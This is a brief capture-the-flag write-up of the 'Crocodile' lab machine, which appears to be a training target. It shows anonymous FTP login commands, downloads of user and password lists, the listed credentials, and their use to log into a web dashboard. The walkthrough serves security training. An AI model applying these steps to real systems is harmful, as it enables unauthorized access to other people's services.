# Crocodile — Tier 1

**Concept:** FTP enumeration with anonymous access reveals credentials for a web application login.

## Recon

```
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
```

## Exploitation

### Step 1 — Anonymous FTP

Connected via FTP with anonymous credentials and downloaded user lists and password files:

```
ftp 10.129.x.x
Name: anonymous
Password: <any>
ftp> ls
ftp> get allowed.userlist
ftp> get allowed.userlist.passwd
```

Contents of `allowed.userlist`:
```
aron
pwnmeow
egotisticalsw
admin
```

Contents of `allowed.userlist.passwd`:
```
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

### Step 2 — Web Login

Used the discovered credentials to log into the web application at `http://10.129.x.x/login` to access the dashboard and retrieve the flag.

## Findings

| Field | Value |
|-------|-------|
| Target IP | `10.129.x.x` |
| Services | FTP (port 21), HTTP (port 80) |
| Attack Vector | Anonymous FTP -> credential discovery -> web login |
| Credentials Found | `admin:rKXM59ESxesUFHAd` (or `admin:Supersecretpassword1`) |
